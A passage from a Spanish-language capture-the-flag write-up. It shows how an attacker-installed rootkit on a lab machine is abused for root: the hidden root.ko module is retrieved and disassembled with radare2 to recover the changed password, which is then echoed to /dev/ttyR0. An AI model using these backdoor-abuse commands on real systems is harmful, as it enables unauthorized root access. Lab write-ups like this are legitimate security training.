## Escalada de privilegios {-}

### Rootear la maquina {-}

La escalada de privilegio aqui se hace utilizando el rootkit.


```bash
ls -l /dev/ttyR0
```

Aqui vemos que el rootkit esta instalado. Continuamos con lo que la web del rootkit nos dice.

```bash
echo "g0tR0ot" > /dev/ttyR0; id
```

Pero no functionna. Pensamos aqui que los atacantes que han instalado el rootkit cambiaron la contraseña.
Segun la web, la contraseña se encuentra en un fichero `root.ko` y mirandolo bien hay un directorio que se
llama `...` (Que cabron)

```bash
cd ...
binary
get root.ko
```

Una vez descargado y como es un binario, tratamos de ver lo que pasa a mas bajo nivel con **radare2**

```bash
radare2 root.ko
aaa
afl
sym.root_write
pdf
```

```{r, echo = FALSE, fig.cap="radare2 root.ko", out.width="90%"}
    knitr::include_graphics("images/radare2rootko.png")
```

Vemos esta parte interesante y probamos una vez mas con:

```bash
echo "g3tPr1v" > /dev/ttyR0; whoami

root
```

Ya estamos root y podemos ver la flag.